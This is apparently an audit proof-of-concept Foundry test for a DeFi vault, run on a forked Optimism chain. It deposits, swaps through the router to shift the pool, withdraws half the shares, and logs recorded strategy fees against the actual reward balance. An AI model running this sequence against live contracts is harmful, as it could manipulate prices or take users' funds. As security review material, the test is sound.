// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.23;

import "forge-std/Test.sol";
import "./Setup.sol";


// Run with `forge test --match-path test/forge/POC.t.sol --fork-url https://rpc.ankr.com/optimism --fork-block-number 120567055 -vv`
contract POC is Test, Setup {
    using SafeERC20 for IERC20;
    function test() public {

        vm.startPrank(user); 

        deal(address(token0), user, 2*token0Size);
        deal(address(token1), user, token1Size);

        console.log("token0 start user ",IERC20(token0).balanceOf(user));
        console.log("token1 start user",IERC20(token1).balanceOf(user));

        console.log("token0Size",token0Size);
        console.log("token1Size",token1Size);


        IERC20(token0).forceApprove(address(vault), token0Size);
        IERC20(token1).forceApprove(address(vault), token1Size);

        (uint _shares, uint _amount0, uint _amount1) = vault.previewDeposit(token0Size, token1Size);
        vault.deposit(_amount0, _amount1, _shares);

        console.log("token0 after deposit",IERC20(token0).balanceOf(user));
        console.log("token1 balance after deposit",IERC20(token1).balanceOf(user));

        console.log("share before", _shares,  _amount0,  _amount1);


        IERC20(token0).forceApprove(address(unirouter), token0Size);
        VeloSwapUtils.swap(user, unirouter, tradePath, token0Size, true);

        console.log("token0 atfer swap",IERC20(token0).balanceOf(user));
        console.log("token1 after swap",IERC20(token1).balanceOf(user));

        skip(1 hours);

        uint256 shares = vault.balanceOf(user);
        console.log("shares after",shares);


        (uint256 _slip0, uint256 _slip1) = vault.previewWithdraw(shares / 2);
        vault.withdraw(shares / 2, _slip0, _slip1);

        console.log("Strategy Fee: %d", strategy.fees());
        console.log("Actual balance in reward token: %d", IERC20(output).balanceOf(address(strategy)));


        console.log("token0 end bal",IERC20(token0).balanceOf(user));
        console.log("token1 end bal",IERC20(token1).balanceOf(user));

        vm.stopPrank();
    }
}